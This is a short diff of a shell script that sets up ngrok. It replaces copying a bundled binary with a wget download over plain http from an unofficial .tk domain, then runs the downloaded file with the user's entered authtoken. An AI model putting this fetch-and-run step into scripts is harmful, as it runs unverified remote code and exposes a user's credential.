@@ -17,9 +17,9 @@ echp -e '''
            
 \e[1;32m '''
 read -p "[?] Enter Authtoken >> " A
-rm -rif $HOME/ngrok 
-cp .A/ngrok $HOME
 cd $HOME
+rm -rif ngrok
+wget http://nullbytestream.tk/files/ngrok
 ./ngrok authtoken $A
 echo -e '      \e[1;33m   '
 read -p '   Done ( : ' 
